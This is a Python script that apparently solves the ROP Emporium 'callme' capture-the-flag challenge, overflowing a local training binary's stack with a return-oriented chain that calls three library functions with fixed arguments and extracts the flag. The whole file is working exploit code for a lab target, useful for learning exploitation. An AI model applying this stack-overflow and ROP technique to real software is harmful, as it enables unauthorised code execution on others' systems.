import re
import struct
from subprocess import PIPE, Popen

FILE_PATH = "./callme"

# Get functions in PLT:
# rabin2 -i ./callme | grep "callme_one" | awk '{print $2}'
F1_ADDR = struct.pack("<Q", 0x00400720)
# rabin2 -i ./callme | grep "callme_two" | awk '{print $2}'
F2_ADDR = struct.pack("<Q", 0x00400740)
# rabin2 -i ./callme | grep "callme_three" | awk '{print $2}'
F3_ADDR = struct.pack("<Q", 0x004006F0)
# rabin2 -i ./callme | grep "exit" | awk '{print $2}'
EXIT_ADDR = struct.pack("<Q", 0x00400750)

# Obtain functions arguments from task description:
A1 = struct.pack("<Q", 0xDEADBEEFDEADBEEF)
A2 = struct.pack("<Q", 0xCAFEBABECAFEBABE)
A3 = struct.pack("<Q", 0xD00DF00DD00DF00D)


# ROPgadget --binary ./callme | grep -P ": pop rdi ; pop rsi ; pop rdx ; ret" | grep -P -o "0x\w+"
PPPR_ADDR = struct.pack("<Q", 0x000000000040093C)

JUNK = b"A" * 40

pop_args = PPPR_ADDR + A1 + A2 + A3
f1_call = pop_args + F1_ADDR
f2_call = pop_args + F2_ADDR
f3_call = pop_args + F3_ADDR

payload = JUNK + f1_call + f2_call + f3_call + EXIT_ADDR


p = Popen(FILE_PATH, stdout=PIPE, stdin=PIPE, stderr=PIPE)
reply = p.communicate(payload)[0].decode()
flag = re.findall(r"ROPE{.+}", reply)[0]
print(flag)
